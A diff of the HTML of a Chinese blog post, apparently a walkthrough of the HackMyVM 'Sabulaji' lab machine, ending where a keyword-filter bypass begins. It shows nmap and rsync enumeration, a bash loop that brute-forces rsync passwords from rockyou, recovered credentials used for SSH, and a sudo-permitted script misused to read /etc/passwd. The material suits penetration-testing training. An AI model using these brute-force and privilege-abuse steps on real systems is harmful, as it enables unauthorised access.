@@ -183,7 +183,7 @@ RSYNC（Remote Sync）是一个用于远程文件同步和备份的开源工具�
 <meta property="og:url" content="https://pingsag3.github.io/post/hackmyvm%20Sabulaji-ce-shi-ji-lu.html">
 <meta property="og:image" content="https://raw.githubusercontent.com/pingsag3/blog_img/main/images/Nazha.jpg">
 <title>hackmyvm Sabulaji测试记录</title>
-<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
+
 
 
 </head>
@@ -249,60 +249,65 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
 </div>
 </div>
     <div id="content">
-<div class="markdown-body" id="postBody"><div class="highlight highlight-source-shell"><pre class="notranslate">大佬WP：
+<div class="markdown-body" id="postBody"><pre lang="shell" class="notranslate"><code class="notranslate">大佬WP：
 https://www.bilibili.com/video/BV1sEMuz6EDh
-http://162.14.82.114/index.php/859/06/12/2025/</pre></div>
+http://162.14.82.114/index.php/859/06/12/2025/
+</code></pre>
 <h3>1. 基本信息</h3>
 <pre class="notranslate"><code class="notranslate">靶机链接：
 https://maze-sec.com/library
 https://hackmyvm.eu/machines/machine.php?vm=Sabulaji
 </code></pre>
-<div class="highlight highlight-source-shell"><pre class="notranslate">难度：⭐️⭐️⭐️
-知识点：信息收集，<span class="pl-s"><span class="pl-pds">`</span>rsync<span class="pl-pds">`</span></span>文件同步，爆破<span class="pl-s"><span class="pl-pds">`</span>rsync<span class="pl-pds">`</span></span>密码，软链接、通配符， <span class="pl-s"><span class="pl-pds">`</span>locate<span class="pl-pds">`</span></span>数据库<span class="pl-s"><span class="pl-pds">`</span>mlocate.db <span class="pl-pds">`</span></span>，<span class="pl-s"><span class="pl-pds">`</span>rsync<span class="pl-pds">`</span></span>提权</pre></div>
+<pre lang="shell" class="notranslate"><code class="notranslate">难度：⭐️⭐️⭐️
+知识点：信息收集，`rsync`文件同步，爆破`rsync`密码，软链接、通配符， `locate`数据库`mlocate.db `，`rsync`提权
+</code></pre>
 <h3>2. 信息收集</h3>
 <h3>Nmap</h3>
-<div class="highlight highlight-source-shell"><pre class="notranslate">└─<span class="pl-c"><span class="pl-c">#</span> arp-scan -l | grep PCS</span>
+<pre lang="shell" class="notranslate"><code class="notranslate">└─# arp-scan -l | grep PCS
 192.168.1.166   08:00:27:27:ab:ab       PCS Systemtechnik GmbH
-└─<span class="pl-c"><span class="pl-c">#</span> IP=192.168.1.166</span>
-└─<span class="pl-c"><span class="pl-c">#</span> nmap -sV -sC -A $IP -Pn</span>
+└─# IP=192.168.1.166
+└─# nmap -sV -sC -A $IP -Pn
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-13 08:24 EDT
-Nmap scan report <span class="pl-k">for</span> 192.168.1.166
+Nmap scan report for 192.168.1.166
 Host is up (0.00087s latency).
 Not shown: 997 closed tcp ports (reset)
 PORT    STATE SERVICE VERSION
 22/tcp  open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
-<span class="pl-k">|</span> ssh-hostkey: 
-<span class="pl-k">|</span>   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
-<span class="pl-k">|</span>   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
-<span class="pl-k">|</span>_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
-80/tcp  open  http    Apache httpd 2.4.62 <span class="pl-s"><span class="pl-pds">((</span>Debian<span class="pl-pds">))</span></span>
-<span class="pl-k">|</span>_http-server-header: Apache/2.4.62 (Debian)
-<span class="pl-k">|</span>_http-title: epages
+| ssh-hostkey: 
+|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
+|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
+|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
+80/tcp  open  http    Apache httpd 2.4.62 ((Debian))
+|_http-server-header: Apache/2.4.62 (Debian)
+|_http-title: epages
 873/tcp open  rsync   (protocol version 31)
-MAC Address: 08:00:27:27:AB:AB (Oracle VirtualBox virtual NIC)</pre></div>
+MAC Address: 08:00:27:27:AB:AB (Oracle VirtualBox virtual NIC)
+</code></pre>
 <p>开放了<code class="notranslate">22、80、873</code>端口，<code class="notranslate">873</code>端口有个<code class="notranslate">rsync</code>比较可疑</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">└─<span class="pl-c"><span class="pl-c">#</span> nmap -sV --script "rsync-list-modules" -p 873 $IP</span>
+<pre lang="shell" class="notranslate"><code class="notranslate">└─# nmap -sV --script "rsync-list-modules" -p 873 $IP
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-13 10:32 EDT
-Nmap scan report <span class="pl-k">for</span> 192.168.1.166
+Nmap scan report for 192.168.1.166
 Host is up (0.00046s latency).
 
 PORT    STATE SERVICE VERSION
 873/tcp open  rsync   (protocol version 31)
-<span class="pl-k">|</span> rsync-list-modules: 
-<span class="pl-k">|</span>   
-<span class="pl-k">|</span>   public              Public Files
-<span class="pl-k">|</span>_  epages              Secret Documents
-MAC Address: 08:00:27:27:AB:AB (Oracle VirtualBox virtual NIC)</pre></div>
+| rsync-list-modules: 
+|   
+|   public              Public Files
+|_  epages              Secret Documents
+MAC Address: 08:00:27:27:AB:AB (Oracle VirtualBox virtual NIC)
+</code></pre>
 <h3>目录扫描</h3>
-<div class="highlight highlight-source-shell"><pre class="notranslate">└─<span class="pl-c"><span class="pl-c">#</span> dirsearch -u http://$IP  -x 403 -e txt,php,html</span>
+<pre lang="shell" class="notranslate"><code class="notranslate">└─# dirsearch -u http://$IP  -x 403 -e txt,php,html
 
-└─<span class="pl-c"><span class="pl-c">#</span> gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://$IP:3000 -x.txt,.php,.html</span>
-</pre></div>
+└─# gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://$IP:3000 -x.txt,.php,.html
+
+</code></pre>
 <p>目录没啥有用信息，重点去<code class="notranslate">873</code>端口的<code class="notranslate">rsync</code>服务</p>
 <h3>3.获得<code class="notranslate">welcome</code>权限</h3>
 <h5><code class="notranslate">rsync</code> 远程文件同步</h5>
 <p>RSYNC（Remote Sync）是一个用于远程文件同步和备份的开源工具。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span>常用的RSYNC参数的解释：</span>
+<pre lang="shell" class="notranslate"><code class="notranslate">#常用的RSYNC参数的解释：
 -a（归档模式）：该参数用于保持文件的所有属性，包括时间戳、权限、所有者等。它是一个常用的参数，用于在源和目标之间保持完全一致。
 -v（详细模式）：该参数用于显示详细的输出信息，包括传输的文件列表、文件大小和传输速度等。
 -r（递归模式）：该参数用于递归地同步目录和子目录，确保源和目标目录之间的所有文件都被同步。
@@ -311,41 +316,44 @@ MAC Address: 08:00:27:27:AB:AB (Oracle VirtualBox virtual NIC)</pre></div>
 -u（更新模式）：该参数用于仅同步源文件中新增或更新的文件，而不处理目标文件中已存在且没有变化的文件。
 --delete（删除模式）：该参数用于在目标目录中删除与源目录中不同的文件。这对于保持目标目录与源目录完全一致很有用。
 --exclude（排除模式）：该参数用于指定要排除的文件或目录，以避免将其同步到目标目录中。
---bwlimit=速度（带宽限制）：该参数用于限制传输速度，以防止RSYNC占用过多的带宽。</pre></div>
+--bwlimit=速度（带宽限制）：该参数用于限制传输速度，以防止RSYNC占用过多的带宽。
+</code></pre>
 <p>在使用rsync命令时，可以通过不同的路径来指定源文件/目录和目标文件/目录</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span>本地与远程之间的文件同步（使用SSH）：</span>
+<pre lang="shell" class="notranslate"><code class="notranslate">#本地与远程之间的文件同步（使用SSH）：
 rsync -e ssh /path/to/local/source user@remote:/path/to/destination
-<span class="pl-c"><span class="pl-c">#</span>同步文件夹：</span>
+#同步文件夹：
 rsync -av /path/to/source/ /path/to/destination/
-<span class="pl-c"><span class="pl-c">#</span>最常用的命令</span>
-rsync -avz -e <span class="pl-s"><span class="pl-pds">'</span>ssh -p xxx<span class="pl-pds">'</span></span> user@1.1.1.1:/data/test/  /data/test/
-<span class="pl-c"><span class="pl-c">#</span>如果端口和用户也是一致的话，是可以省略的</span>
+#最常用的命令
+rsync -avz -e 'ssh -p xxx' user@1.1.1.1:/data/test/  /data/test/
+#如果端口和用户也是一致的话，是可以省略的
 rsync -avz 1.1.1.1:/data/test/  /data/test/
-</pre></div>
+
+</code></pre>
 <p>在<code class="notranslate">public</code>中可以发现<code class="notranslate">todo.list </code>，先取下来</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">└─<span class="pl-c"><span class="pl-c">#</span> rsync $IP::</span>
+<pre lang="shell" class="notranslate"><code class="notranslate">└─# rsync $IP::
 
 public          Public Files
 epages          Secret Documents
-└─<span class="pl-c"><span class="pl-c">#</span> rsync -av --list-only rsync://$IP/public</span>
+└─# rsync -av --list-only rsync://$IP/public
 
 receiving incremental file list
-drwxr-xr-x          4,096 2025/05/15 12:35:39 <span class="pl-c1">.</span>
+drwxr-xr-x          4,096 2025/05/15 12:35:39 .
 -rw-r--r--            433 2025/05/15 12:35:39 todo.list
 
 sent 20 bytes  received 69 bytes  178.00 bytes/sec
 total size is 433  speedup is 4.87
-└─<span class="pl-c"><span class="pl-c">#</span> rsync -av rsync://$IP:873/public/todo.list .       </span>
+└─# rsync -av rsync://$IP:873/public/todo.list .       
 
 receiving incremental file list
 todo.list
 
 sent 43 bytes  received 528 bytes  1,142.00 bytes/sec
 total size is 433  speedup is 0.76
-└─<span class="pl-c"><span class="pl-c">#</span> ls -l todo.list                             </span>
--rw-r--r-- 1 root sslh 433  5月15日 12:35 todo.list                                                                            </pre></div>
+└─# ls -l todo.list                             
+-rw-r--r-- 1 root sslh 433  5月15日 12:35 todo.list                                                                            
+</code></pre>
 <p>获得提示信息<code class="notranslate">todo.list</code></p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">└─<span class="pl-c"><span class="pl-c">#</span> cat todo.list         </span>
+<pre lang="shell" class="notranslate"><code class="notranslate">└─# cat todo.list         
 To-Do List
 =========
 
@@ -355,45 +363,49 @@ To-Do List
 
 2. sabulaji: Change to a strong password
    - Create a new password (minimum 12 characters, include uppercase, lowercase, numbers, and symbols).
-   - Update the password <span class="pl-k">in</span> the system settings.
+   - Update the password in the system settings.
    - Ensure the new password is not reused from other accounts.
-=========</pre></div>
+=========
+</code></pre>
 <p>访问<code class="notranslate">epages</code>需要密码，结合提示信息就是爆破<code class="notranslate">sabulaji</code>账户的密码</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">└─<span class="pl-c"><span class="pl-c">#</span> rsync -av --list-only rsync://$IP/epages</span>
+<pre lang="shell" class="notranslate"><code class="notranslate">└─# rsync -av --list-only rsync://$IP/epages
 
 Password: 
 @ERROR: auth failed on module epages
-rsync error: error starting client-server protocol (code 5) at main.c(1850) [Receiver<span class="pl-k">=</span>3.3.0]</pre></div>
+rsync error: error starting client-server protocol (code 5) at main.c(1850) [Receiver=3.3.0]
+</code></pre>
 <h5>爆破<code class="notranslate"> rsync</code>密码</h5>
 <p>编写个<code class="notranslate"> rsync</code>爆破脚本</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">└─<span class="pl-c"><span class="pl-c">#</span> cat bp_rsync.sh</span>
-<span class="pl-c"><span class="pl-c">#!</span>/bin/bash</span>
-<span class="pl-k">for</span> <span class="pl-smi">i</span> <span class="pl-k">in</span> <span class="pl-s"><span class="pl-pds">$(</span>cat /usr/share/wordlists/rockyou.txt<span class="pl-pds">)</span></span>
-<span class="pl-k">do</span>
-  <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>尝试密码:<span class="pl-smi">$i</span><span class="pl-pds">"</span></span>
-  RSYNC_PASSWORD=<span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$i</span><span class="pl-pds">"</span></span> rsync --list-only rsync://sabulaji@192.168.1.166:873/epages/ <span class="pl-k">&amp;&amp;</span> <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>成功!密码:<span class="pl-smi">$i</span><span class="pl-pds">"</span></span> <span class="pl-k">&amp;&amp;</span> <span class="pl-c1">break</span>
-<span class="pl-k">done</span>
+<pre lang="shell" class="notranslate"><code class="notranslate">└─# cat bp_rsync.sh
+#!/bin/bash
+for i in $(cat /usr/share/wordlists/rockyou.txt)
+do
+  echo "尝试密码:$i"
+  RSYNC_PASSWORD="$i" rsync --list-only rsync://sabulaji@192.168.1.166:873/epages/ &amp;&amp; echo "成功!密码:$i" &amp;&amp; break
+done
 
-└─<span class="pl-c"><span class="pl-c">#</span> ./bp_rsync.sh</span></pre></div>
+└─# ./bp_rsync.sh
+</code></pre>
 <p>获得密码 <code class="notranslate">admin123</code>，要跑很久，在<code class="notranslate">rockyou</code>的九万多行</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">@ERROR: auth failed on module epages
-rsync error: error starting client-server protocol (code 5) at main.c(1850) [Receiver<span class="pl-k">=</span>3.3.0]
+<pre lang="shell" class="notranslate"><code class="notranslate">@ERROR: auth failed on module epages
+rsync error: error starting client-server protocol (code 5) at main.c(1850) [Receiver=3.3.0]
 尝试密码:admin123
 
-drwxr-xr-x          4,096 2025/05/15 12:17:03 <span class="pl-c1">.</span>
+drwxr-xr-x          4,096 2025/05/15 12:17:03 .
 -rw-r--r--         13,312 2025/05/15 12:17:03 secrets.doc
-成功<span class="pl-k">!</span>密码:admin123</pre></div>
+成功!密码:admin123
+</code></pre>
 <p>获取 <code class="notranslate">secrets.doc</code>文档</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">└─<span class="pl-c"><span class="pl-c">#</span> rsync -av --list-only rsync://sabulaji@$IP/epages/</span>
+<pre lang="sh" class="notranslate"><code class="notranslate">└─# rsync -av --list-only rsync://sabulaji@$IP/epages/
 
 Password: 
 receiving incremental file list
-drwxr-xr-x          4,096 2025/05/15 12:17:03 <span class="pl-c1">.</span>
+drwxr-xr-x          4,096 2025/05/15 12:17:03 .
 -rw-r--r--         13,312 2025/05/15 12:17:03 secrets.doc
 
 sent 20 bytes  received 73 bytes  37.20 bytes/sec
 total size is 13,312  speedup is 143.14
-└─<span class="pl-c"><span class="pl-c">#</span> rsync -av  rsync://sabulaji@$IP:873/epages/ ./</span>
+└─# rsync -av  rsync://sabulaji@$IP:873/epages/ ./
 
 Password: 
 receiving incremental file list
@@ -404,122 +416,129 @@ sent 46 bytes  received 13,435 bytes  3,851.71 bytes/sec
 total size is 13,312  speedup is 0.99
                                                                                                                                    
 ┌──(root㉿kali)-[/tmp]
-└─<span class="pl-c"><span class="pl-c">#</span> ls -l secrets.doc </span>
--rw-r--r-- 1 root root 13312  5月15日 12:17 secrets.doc</pre></div>
+└─# ls -l secrets.doc 
+-rw-r--r-- 1 root root 13312  5月15日 12:17 secrets.doc
+</code></pre>
 <p>打开 <code class="notranslate">secrets.doc</code>文档</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span>secrets.doc</span>
+<pre lang="shell" class="notranslate"><code class="notranslate">#secrets.doc
 The Art of Keeping Secrets
-In a world overflowing with information, keeping secrets is both an art and a challenge. Whether it<span class="pl-s"><span class="pl-pds">'</span>s a personal diary tucked under a mattress or a cryptic message passed in a crowded café, the allure of hidden knowledge captivates us all.</span>
-<span class="pl-s">Take, for example, the old server room in my office. It’s a dusty corner where forgotten machines hum quietly. One of them, a relic from the early 2000s, still runs an FTP service. The admin, in a moment of questionable judgment, named the default account "welcome." I overheard a colleague chuckle about it, saying the password was something absurdly simple, like "P@ssw0rd123!"—hardly a secret worth keeping, but it’s been untouched for years.</span>
-<span class="pl-s">Secrets, however, aren’t just about passwords or hidden files. They’re about intent. A whispered rumor about a project, a coded glance between friends, or even the way we guard our thoughts. The best secrets are those that hide in plain sight, unnoticed by the distracted eye.</span>
-<span class="pl-s">So, how do we master this art? First, blend in. Don’t make your secret obvious. Second, protect it with something stronger than "P@ssw0rd123!"—maybe a phrase only you’d understand. And finally, trust sparingly. Even the most welcoming systems can betray you if you’re not careful.</span>
-<span class="pl-s">In the end, secrets remind us that not everything needs to be shared. Some things are better left unsaid, or at least, left to those who know where to look.</span>
-<span class="pl-s"></span></pre></div>
+In a world overflowing with information, keeping secrets is both an art and a challenge. Whether it's a personal diary tucked under a mattress or a cryptic message passed in a crowded café, the allure of hidden knowledge captivates us all.
+Take, for example, the old server room in my office. It’s a dusty corner where forgotten machines hum quietly. One of them, a relic from the early 2000s, still runs an FTP service. The admin, in a moment of questionable judgment, named the default account "welcome." I overheard a colleague chuckle about it, saying the password was something absurdly simple, like "P@ssw0rd123!"—hardly a secret worth keeping, but it’s been untouched for years.
+Secrets, however, aren’t just about passwords or hidden files. They’re about intent. A whispered rumor about a project, a coded glance between friends, or even the way we guard our thoughts. The best secrets are those that hide in plain sight, unnoticed by the distracted eye.
+So, how do we master this art? First, blend in. Don’t make your secret obvious. Second, protect it with something stronger than "P@ssw0rd123!"—maybe a phrase only you’d understand. And finally, trust sparingly. Even the most welcoming systems can betray you if you’re not careful.
+In the end, secrets remind us that not everything needs to be shared. Some things are better left unsaid, or at least, left to those who know where to look.
+
+</code></pre>
 <p>里面有一组账号密码信息：<code class="notranslate">welcome:P@ssw0rd123!</code> ，尝试进行登录是<code class="notranslate"> ssh</code>的账号</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">└─<span class="pl-c"><span class="pl-c">#</span> ssh welcome@$IP                                                                       </span>
-welcome@192.168.1.166<span class="pl-s"><span class="pl-pds">'</span>s password: #P@ssw0rd123!</span>
-<span class="pl-s">welcome@Sabulaji:~$ id</span>
-<span class="pl-s">uid=1000(welcome) gid=1000(welcome) groups=1000(welcome),123(mlocate)</span></pre></div>
-<h5>拿到<code class="notranslate">user.txt</code></h5>
-<div class="highlight highlight-source-shell"><pre class="notranslate">welcome@Sabulaji:<span class="pl-k">~</span>$ id
+<pre lang="shell" class="notranslate"><code class="notranslate">└─# ssh welcome@$IP                                                                       
+welcome@192.168.1.166's password: #P@ssw0rd123!
+welcome@Sabulaji:~$ id
 uid=1000(welcome) gid=1000(welcome) groups=1000(welcome),123(mlocate)
-welcome@Sabulaji:<span class="pl-k">~</span>$ <span class="pl-c1">cd</span>
-welcome@Sabulaji:<span class="pl-k">~</span>$ ls
+</code></pre>
+<h5>拿到<code class="notranslate">user.txt</code></h5>
+<pre lang="shell" class="notranslate"><code class="notranslate">welcome@Sabulaji:~$ id
+uid=1000(welcome) gid=1000(welcome) groups=1000(welcome),123(mlocate)
+welcome@Sabulaji:~$ cd
+welcome@Sabulaji:~$ ls
 user.txt
-welcome@Sabulaji:<span class="pl-k">~</span>$ cat user.txt 
-</pre></div>
+welcome@Sabulaji:~$ cat user.txt 
+
+</code></pre>
 <h3>4.获得<code class="notranslate">sabulaji</code>权限</h3>
 <p><code class="notranslate">sudo</code>发现 sabulaji 用户能够以 <code class="notranslate">sudo </code>身份运行 <code class="notranslate">/opt/sync.sh</code></p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">welcome@Sabulaji:/home$ sudo -l
-Matching Defaults entries <span class="pl-k">for</span> welcome on Sabulaji:
-    env_reset, mail_badpass, secure_path=/usr/local/sbin<span class="pl-cce">\:</span>/usr/local/bin<span class="pl-cce">\:</span>/usr/sbin<span class="pl-cce">\:</span>/usr/bin<span class="pl-cce">\:</span>/sbin<span class="pl-cce">\:</span>/bin
+<pre lang="shell" class="notranslate"><code class="notranslate">welcome@Sabulaji:/home$ sudo -l
+Matching Defaults entries for welcome on Sabulaji:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
 
 User welcome may run the following commands on Sabulaji:
     (sabulaji) NOPASSWD: /opt/sync.sh
     
 welcome@Sabulaji:/home$ cat /opt/sync.sh
-<span class="pl-c"><span class="pl-c">#!</span>/bin/bash</span>
+#!/bin/bash
 
-<span class="pl-k">if</span> [ <span class="pl-k">-z</span> <span class="pl-smi">$1</span> ]<span class="pl-k">;</span> <span class="pl-k">then</span>
-    <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>error: note missing<span class="pl-pds">"</span></span>
-    <span class="pl-c1">exit</span>
-<span class="pl-k">fi</span>
+if [ -z $1 ]; then
+    echo "error: note missing"
+    exit
+fi
 
-note=<span class="pl-smi">$1</span>
+note=$1
 
-<span class="pl-k">if</span> [[ <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$note</span><span class="pl-pds">"</span></span> <span class="pl-k">==</span> <span class="pl-k">*</span><span class="pl-s"><span class="pl-pds">"</span>sabulaji<span class="pl-pds">"</span></span><span class="pl-k">*</span> ]]<span class="pl-k">;</span> <span class="pl-k">then</span>
-    <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>error: forbidden<span class="pl-pds">"</span></span>
-    <span class="pl-c1">exit</span>
-<span class="pl-k">fi</span>
+if [[ "$note" == *"sabulaji"* ]]; then
+    echo "error: forbidden"
+    exit
+fi
 
-difference=<span class="pl-s"><span class="pl-pds">$(</span>diff /home/sabulaji/personal/notes.txt <span class="pl-smi">$note</span><span class="pl-pds">)</span></span>
+difference=$(diff /home/sabulaji/personal/notes.txt $note)
 
-<span class="pl-k">if</span> [ <span class="pl-k">-z</span> <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$difference</span><span class="pl-pds">"</span></span> ]<span class="pl-k">;</span> <span class="pl-k">then</span>
-    <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>no update<span class="pl-pds">"</span></span>
-    <span class="pl-c1">exit</span>
-<span class="pl-k">fi</span>
+if [ -z "$difference" ]; then
+    echo "no update"
+    exit
+fi
 
-<span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>Difference: <span class="pl-smi">$difference</span><span class="pl-pds">"</span></span>
+echo "Difference: $difference"
 
-cp <span class="pl-smi">$note</span> /home/sabulaji/personal/notes.txt
+cp $note /home/sabulaji/personal/notes.txt
 
-<span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>[+] Updated.<span class="pl-pds">"</span></span></pre></div>
+echo "[+] Updated."
+</code></pre>
 <p>​    脚本首先检查是否提供了参数，如果没有参数就报错退出。然后检查参数中是否包含<code class="notranslate">sabulaji</code>这个字符串，如果包含就拒绝执行。接着比较用户提供的文件与<code class="notranslate">/home/sabulaji/personal/notes.txt</code>的差异，如果没有差异就退出。如果有差异就显示差异内容，复制文件覆盖目标文件，最后提示更新成功。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">welcome@Sabulaji:/tmp$ sudo -u sabulaji /opt/sync.sh /etc/passwd
+<pre lang="shell" class="notranslate"><code class="notranslate">welcome@Sabulaji:/tmp$ sudo -u sabulaji /opt/sync.sh /etc/passwd
 Difference: 1c1,27
-<span class="pl-k">&lt;</span> Maybe you can find it...
+&lt; Maybe you can find it...
 ---
-<span class="pl-k">&gt;</span> root:x:0:0:root:/root:/bin/bash
-<span class="pl-k">&gt;</span> daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-<span class="pl-k">&gt;</span> bin:x:2:2:bin:/bin:/usr/sbin/nologin
-<span class="pl-k">&gt;</span> sys:x:3:3:sys:/dev:/usr/sbin/nologin
-<span class="pl-k">&gt;</span> sync:x:4:65534:sync:/bin:/bin/sync
-<span class="pl-k">&gt;</span> games:x:5:60:games:/usr/games:/usr/sbin/nologin
-<span class="pl-k">&gt;</span> man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
-<span class="pl-k">&gt;</span> lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
-<span class="pl-k">&gt;</span> mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
-<span class="pl-k">&gt;</span> news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
-<span class="pl-k">&gt;</span> uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
-<span class="pl-k">&gt;</span> proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
-<span class="pl-k">&gt;</span> www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
-<span class="pl-k">&gt;</span> backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
-<span class="pl-k">&gt;</span> list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
-<span class="pl-k">&gt;</span> irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
-<span class="pl-k">&gt;</span> gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
-<span class="pl-k">&gt;</span> nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
-<span class="pl-k">&gt;</span> _apt:x:100:65534::/nonexistent:/usr/sbin/nologin
-<span class="pl-k">&gt;</span> systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
-<span class="pl-k">&gt;</span> systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
-<span class="pl-k">&gt;</span> systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
-<span class="pl-k">&gt;</span> systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
-<span class="pl-k">&gt;</span> messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
-<span class="pl-k">&gt;</span> sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
-<span class="pl-k">&gt;</span> welcome:x:1000:1000:,,,:/home/welcome:/bin/bash
-<span class="pl-k">&gt;</span> sabulaji:x:1001:1001::/home/sabulaji:/bin/bash
+&gt; root:x:0:0:root:/root:/bin/bash
+&gt; daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+&gt; bin:x:2:2:bin:/bin:/usr/sbin/nologin
+&gt; sys:x:3:3:sys:/dev:/usr/sbin/nologin
+&gt; sync:x:4:65534:sync:/bin:/bin/sync
+&gt; games:x:5:60:games:/usr/games:/usr/sbin/nologin
+&gt; man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+&gt; lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+&gt; mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+&gt; news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+&gt; uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+&gt; proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+&gt; www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+&gt; backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+&gt; list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+&gt; irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+&gt; gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+&gt; nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+&gt; _apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+&gt; systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+&gt; systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+&gt; systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+&gt; systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+&gt; messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
+&gt; sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
+&gt; welcome:x:1000:1000:,,,:/home/welcome:/bin/bash
+&gt; sabulaji:x:1001:1001::/home/sabulaji:/bin/bash
 [+] Updated.
 welcome@Sabulaji:/tmp$ 
 welcome@Sabulaji:/tmp$ sudo -u sabulaji /opt/sync.sh /root/root.txt
 diff: /root/root.txt: Permission denied
 no update
 welcome@Sabulaji:/tmp$ sudo -u sabulaji /opt/sync.sh /home/sabulaji/personal/notes.txt
-error: forbidden</pre></div>
+error: forbidden
+</code></pre>
 <h5><code class="notranslate">关键字过滤</code></h5>
 <p>​		需实现的核心操作是不输入<code class="notranslate">sabulaji</code>关键字的请款下，读取<code class="notranslate">sabulaji</code>目录下的内容，可通过<code class="notranslate">软连接</code>、<code class="notranslate">通配符</code>等方式实现</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">welcome@Sabulaji:/tmp$ ln -sv /home/sabulaji/ /tmp/a
-<span class="pl-s"><span class="pl-pds">'</span>/tmp/a<span class="pl-pds">'</span></span> -<span class="pl-k">&gt;</span> <span class="pl-s"><span class="pl-pds">'</span>/home/sabulaji/<span class="pl-pds">'</span></span>
+<pre lang="shell" class="notranslate"><code class="notranslate">welcome@Sabulaji:/tmp$ ln -sv /home/sabulaji/ /tmp/a
+'/tmp/a' -&gt; '/home/sabulaji/'
 welcome@Sabulaji:/tmp$ ls -l /tmp/a
-lrwxrwxrwx 1 welcome welcome 15 Jun 14 00:57 /tmp/a -<span class="pl-k">&gt;</span> /home/sabulaji/
-welcome@Sabulaji:/tmp$ sudo -u sabulaji /opt/sync.sh /home/sabu<span class="pl-k">*</span>/personal/notes.txt
+lrwxrwxrwx 1 welcome welcome 15 Jun 14 00:57 /tmp/a -&gt; /home/sabulaji/
+welcome@Sabulaji:/tmp$ sudo -u sabulaji /opt/sync.sh /home/sabu*/personal/notes.txt
 no update
